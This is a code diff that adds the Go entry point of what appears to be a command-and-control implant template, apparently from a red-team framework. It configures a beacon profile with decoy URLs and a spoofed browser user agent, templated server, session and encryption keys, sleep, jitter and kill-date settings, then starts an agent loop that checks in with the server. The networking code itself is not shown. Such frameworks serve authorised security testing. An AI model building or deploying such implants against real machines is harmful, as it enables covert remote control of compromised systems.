@@ -1,0 +1,44 @@
+package main
+
+import (
+	"encoding/base64"
+	"fmt"
+)
+
+func main() {
+	profile := "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+	server := "{{ HOST }}"
+	sessionID := "{{ SESSION_ID }}"
+	killDate := ""
+	workingHours := ""
+	delay := 5
+	jitter := 0.0
+	lostLimit := 60
+    stagingKeyBase64 := "{{ STAGING_KEY | safe }}"
+	aesKeyBase64 := "{{ AES_KEY | safe }}"
+
+	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
+	if err != nil {
+		fmt.Println("Error decoding stagingKey:", err)
+		return
+	}
+
+	aeskey, err := base64.StdEncoding.DecodeString(aesKeyBase64)
+	if err != nil {
+		fmt.Println("Error decoding aeskey:", err)
+		return
+	}
+
+	packetHandler := &PacketHandler{
+		missedCheckins: 0,
+		headers:        make(map[string]string),
+		server:         server,
+		stagingKey:     stagingKey,
+		aeskey:         aeskey,
+	}
+	agent := NewMainAgent(packetHandler, profile, server, sessionID, killDate, workingHours, delay, jitter, lostLimit)
+
+	go agent.run()
+
+	select {}
+}
